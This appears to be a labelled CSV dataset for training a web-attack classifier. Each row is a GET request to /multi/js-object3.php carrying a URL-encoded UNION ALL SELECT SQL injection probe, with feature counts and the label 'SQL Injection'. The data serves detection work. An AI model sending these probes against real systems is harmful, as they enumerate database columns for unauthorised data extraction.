method,path,body,single_q,double_q,dashes,braces,spaces,SQL Badwords,XSS Badwords,Command Injection Badords,class
GET,/multi/js-object3.php?p=-7770%29%29%29%20union%20all%20select%202330%2c2330%2c2330%2c2330%2c2330%2c2330%2c2330%2c2330%2c2330%2c2330%2c2330%2c2330%2c2330%2c2330%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9046%29%29%29%20union%20all%20select%207075%2c7075%2c7075%2c7075%2c7075%2c7075%2c7075%2c7075%2c7075%2c7075%2c7075%2c7075%2c7075%2c7075%2c7075%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8016%29%29%29%20union%20all%20select%204960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%2c4960%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1810%29%29%29%20union%20all%20select%205211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%2c5211%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9970%29%29%29%20union%20all%20select%204224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%2c4224%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1856%29%29%29%20union%20all%20select%206447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%2c6447%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5693%20union%20all%20select%205994%2c5994%2c5994%2c5994%2c5994%2c5994%2c5994%2c5994%2c5994%2c5994%2c5994%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2577%20union%20all%20select%208254%2c8254%2c8254%2c8254%2c8254%2c8254%2c8254%2c8254%2c8254%2c8254%2c8254%2c8254%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5455%20union%20all%20select%203795%2c3795%2c3795%2c3795%2c3795%2c3795%2c3795%2c3795%2c3795%2c3795%2c3795%2c3795%2c3795%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8399%20union%20all%20select%208253%2c8253%2c8253%2c8253%2c8253%2c8253%2c8253%2c8253%2c8253%2c8253%2c8253%2c8253%2c8253%2c8253%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-4620%20union%20all%20select%205963%2c5963%2c5963%2c5963%2c5963%2c5963%2c5963%2c5963%2c5963%2c5963%2c5963%2c5963%2c5963%2c5963%2c5963%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5589%20union%20all%20select%209649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%2c9649%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2340%20union%20all%20select%205771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%2c5771%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8778%20union%20all%20select%202350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%2c2350%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-7240%20union%20all%20select%206479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%2c6479%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2841%20union%20all%20select%209415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%2c9415%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1077%20union%20all%20select%208204%2c8204%2c8204%2c8204%2c8204%2c8204%2c8204%2c8204%2c8204%2c8204%2c8204%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-6779%20union%20all%20select%204753%2c4753%2c4753%2c4753%2c4753%2c4753%2c4753%2c4753%2c4753%2c4753%2c4753%2c4753%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3256%20union%20all%20select%207995%2c7995%2c7995%2c7995%2c7995%2c7995%2c7995%2c7995%2c7995%2c7995%2c7995%2c7995%2c7995%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-6008%20union%20all%20select%206629%2c6629%2c6629%2c6629%2c6629%2c6629%2c6629%2c6629%2c6629%2c6629%2c6629%2c6629%2c6629%2c6629%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1489%20union%20all%20select%208565%2c8565%2c8565%2c8565%2c8565%2c8565%2c8565%2c8565%2c8565%2c8565%2c8565%2c8565%2c8565%2c8565%2c8565%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2000%20union%20all%20select%208691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%2c8691%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-7488%20union%20all%20select%204636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%2c4636%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2849%20union%20all%20select%202073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%2c2073%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9931%20union%20all%20select%204793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%2c4793%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1523%20union%20all%20select%205608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%2c5608%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1020%20union%20all%20select%203655%2c3655%2c3655%2c3655%2c3655%2c3655%2c3655%2c3655%2c3655%2c3655%2c3655%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3988%20union%20all%20select%203901%2c3901%2c3901%2c3901%2c3901%2c3901%2c3901%2c3901%2c3901%2c3901%2c3901%2c3901%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2966%20union%20all%20select%203807%2c3807%2c3807%2c3807%2c3807%2c3807%2c3807%2c3807%2c3807%2c3807%2c3807%2c3807%2c3807%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1179%20union%20all%20select%205829%2c5829%2c5829%2c5829%2c5829%2c5829%2c5829%2c5829%2c5829%2c5829%2c5829%2c5829%2c5829%2c5829%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3712%20union%20all%20select%209932%2c9932%2c9932%2c9932%2c9932%2c9932%2c9932%2c9932%2c9932%2c9932%2c9932%2c9932%2c9932%2c9932%2c9932%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5581%20union%20all%20select%204826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%2c4826%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8523%20union%20all%20select%204652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%2c4652%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-6848%20union%20all%20select%203715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%2c3715%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1414%20union%20all%20select%208480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%2c8480%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2236%20union%20all%20select%203177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%2c3177%23,,0,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9357%27%20union%20all%20select%207420%2c7420%2c7420%2c7420%2c7420%2c7420%2c7420%2c7420%2c7420%2c7420%2c7420%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3573%27%20union%20all%20select%208879%2c8879%2c8879%2c8879%2c8879%2c8879%2c8879%2c8879%2c8879%2c8879%2c8879%2c8879%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3297%27%20union%20all%20select%205564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3496%27%20union%20all%20select%203011%2c3011%2c3011%2c3011%2c3011%2c3011%2c3011%2c3011%2c3011%2c3011%2c3011%2c3011%2c3011%2c3011%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1514%27%20union%20all%20select%209826%2c9826%2c9826%2c9826%2c9826%2c9826%2c9826%2c9826%2c9826%2c9826%2c9826%2c9826%2c9826%2c9826%2c9826%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-7855%27%20union%20all%20select%203021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%2c3021%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-4431%27%20union%20all%20select%207808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%2c7808%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9269%27%20union%20all%20select%206952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%2c6952%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9456%27%20union%20all%20select%209270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%2c9270%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-6329%27%20union%20all%20select%202169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%2c2169%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-6880%27%29%20union%20all%20select%201707%2c1707%2c1707%2c1707%2c1707%2c1707%2c1707%2c1707%2c1707%2c1707%2c1707%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3808%27%29%20union%20all%20select%206829%2c6829%2c6829%2c6829%2c6829%2c6829%2c6829%2c6829%2c6829%2c6829%2c6829%2c6829%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8202%27%29%20union%20all%20select%203774%2c3774%2c3774%2c3774%2c3774%2c3774%2c3774%2c3774%2c3774%2c3774%2c3774%2c3774%2c3774%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8928%27%29%20union%20all%20select%205488%2c5488%2c5488%2c5488%2c5488%2c5488%2c5488%2c5488%2c5488%2c5488%2c5488%2c5488%2c5488%2c5488%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5254%27%29%20union%20all%20select%205741%2c5741%2c5741%2c5741%2c5741%2c5741%2c5741%2c5741%2c5741%2c5741%2c5741%2c5741%2c5741%2c5741%2c5741%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3146%27%29%20union%20all%20select%207460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%2c7460%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9229%27%29%20union%20all%20select%205564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%2c5564%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5489%27%29%20union%20all%20select%206176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%2c6176%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3810%27%29%20union%20all%20select%204467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%2c4467%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8368%27%29%20union%20all%20select%209806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%2c9806%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9024%27%29%29%20union%20all%20select%205695%2c5695%2c5695%2c5695%2c5695%2c5695%2c5695%2c5695%2c5695%2c5695%2c5695%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9631%27%29%29%20union%20all%20select%204358%2c4358%2c4358%2c4358%2c4358%2c4358%2c4358%2c4358%2c4358%2c4358%2c4358%2c4358%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2118%27%29%29%20union%20all%20select%209679%2c9679%2c9679%2c9679%2c9679%2c9679%2c9679%2c9679%2c9679%2c9679%2c9679%2c9679%2c9679%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8714%27%29%29%20union%20all%20select%202408%2c2408%2c2408%2c2408%2c2408%2c2408%2c2408%2c2408%2c2408%2c2408%2c2408%2c2408%2c2408%2c2408%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-4972%27%29%29%20union%20all%20select%206023%2c6023%2c6023%2c6023%2c6023%2c6023%2c6023%2c6023%2c6023%2c6023%2c6023%2c6023%2c6023%2c6023%2c6023%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1208%27%29%29%20union%20all%20select%209014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%2c9014%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5994%27%29%29%20union%20all%20select%204585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%2c4585%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-4196%27%29%29%20union%20all%20select%205641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%2c5641%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9699%27%29%29%20union%20all%20select%206337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%2c6337%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5975%27%29%29%20union%20all%20select%205061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%2c5061%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2505%27%29%29%29%20union%20all%20select%204260%2c4260%2c4260%2c4260%2c4260%2c4260%2c4260%2c4260%2c4260%2c4260%2c4260%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2136%27%29%29%29%20union%20all%20select%207119%2c7119%2c7119%2c7119%2c7119%2c7119%2c7119%2c7119%2c7119%2c7119%2c7119%2c7119%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2507%27%29%29%29%20union%20all%20select%201007%2c1007%2c1007%2c1007%2c1007%2c1007%2c1007%2c1007%2c1007%2c1007%2c1007%2c1007%2c1007%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5548%27%29%29%29%20union%20all%20select%207040%2c7040%2c7040%2c7040%2c7040%2c7040%2c7040%2c7040%2c7040%2c7040%2c7040%2c7040%2c7040%2c7040%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5499%27%29%29%29%20union%20all%20select%204922%2c4922%2c4922%2c4922%2c4922%2c4922%2c4922%2c4922%2c4922%2c4922%2c4922%2c4922%2c4922%2c4922%2c4922%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-6632%27%29%29%29%20union%20all%20select%207490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%2c7490%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8748%27%29%29%29%20union%20all%20select%204724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%2c4724%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9643%27%29%29%29%20union%20all%20select%207566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%2c7566%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2960%27%29%29%29%20union%20all%20select%202518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%2c2518%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1868%27%29%29%29%20union%20all%20select%205421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%2c5421%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8745%27%20union%20all%20select%208244%2c8244%2c8244%2c8244%2c8244%2c8244%2c8244%2c8244%2c8244%2c8244%2c8244%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5817%27%20union%20all%20select%201350%2c1350%2c1350%2c1350%2c1350%2c1350%2c1350%2c1350%2c1350%2c1350%2c1350%2c1350%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5846%27%20union%20all%20select%209680%2c9680%2c9680%2c9680%2c9680%2c9680%2c9680%2c9680%2c9680%2c9680%2c9680%2c9680%2c9680%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8410%27%20union%20all%20select%208422%2c8422%2c8422%2c8422%2c8422%2c8422%2c8422%2c8422%2c8422%2c8422%2c8422%2c8422%2c8422%2c8422%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3487%27%20union%20all%20select%204060%2c4060%2c4060%2c4060%2c4060%2c4060%2c4060%2c4060%2c4060%2c4060%2c4060%2c4060%2c4060%2c4060%2c4060%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9084%27%20union%20all%20select%201916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%2c1916%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-7156%27%20union%20all%20select%208989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%2c8989%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-7631%27%20union%20all%20select%204562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%2c4562%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9048%27%20union%20all%20select%208761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%2c8761%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8861%27%20union%20all%20select%203591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%2c3591%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1370%27%29%20union%20all%20select%208112%2c8112%2c8112%2c8112%2c8112%2c8112%2c8112%2c8112%2c8112%2c8112%2c8112%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5356%27%29%20union%20all%20select%206558%2c6558%2c6558%2c6558%2c6558%2c6558%2c6558%2c6558%2c6558%2c6558%2c6558%2c6558%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-4043%27%29%20union%20all%20select%202781%2c2781%2c2781%2c2781%2c2781%2c2781%2c2781%2c2781%2c2781%2c2781%2c2781%2c2781%2c2781%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-6430%27%29%20union%20all%20select%207766%2c7766%2c7766%2c7766%2c7766%2c7766%2c7766%2c7766%2c7766%2c7766%2c7766%2c7766%2c7766%2c7766%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9551%27%29%20union%20all%20select%207954%2c7954%2c7954%2c7954%2c7954%2c7954%2c7954%2c7954%2c7954%2c7954%2c7954%2c7954%2c7954%2c7954%2c7954%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-7059%27%29%20union%20all%20select%206571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%2c6571%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-8971%27%29%20union%20all%20select%202593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%2c2593%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-7039%27%29%20union%20all%20select%206910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%2c6910%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-6146%27%29%20union%20all%20select%204222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%2c4222%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9313%27%29%20union%20all%20select%201842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%2c1842%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-1144%27%29%29%20union%20all%20select%209798%2c9798%2c9798%2c9798%2c9798%2c9798%2c9798%2c9798%2c9798%2c9798%2c9798%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2205%27%29%29%20union%20all%20select%206998%2c6998%2c6998%2c6998%2c6998%2c6998%2c6998%2c6998%2c6998%2c6998%2c6998%2c6998%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-4581%27%29%29%20union%20all%20select%209950%2c9950%2c9950%2c9950%2c9950%2c9950%2c9950%2c9950%2c9950%2c9950%2c9950%2c9950%2c9950%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-9769%27%29%29%20union%20all%20select%208948%2c8948%2c8948%2c8948%2c8948%2c8948%2c8948%2c8948%2c8948%2c8948%2c8948%2c8948%2c8948%2c8948%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-7324%27%29%29%20union%20all%20select%205517%2c5517%2c5517%2c5517%2c5517%2c5517%2c5517%2c5517%2c5517%2c5517%2c5517%2c5517%2c5517%2c5517%2c5517%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-5416%27%29%29%20union%20all%20select%202219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%2c2219%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-3139%27%29%29%20union%20all%20select%209864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%2c9864%23,,1,0,0,0,4,2,0,0,SQL Injection
GET,/multi/js-object3.php?p=-2804%27%29%29%20union%20all%20select%208626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%2c8626%23,,1,0,0,0,4,2,0,0,SQL Injection
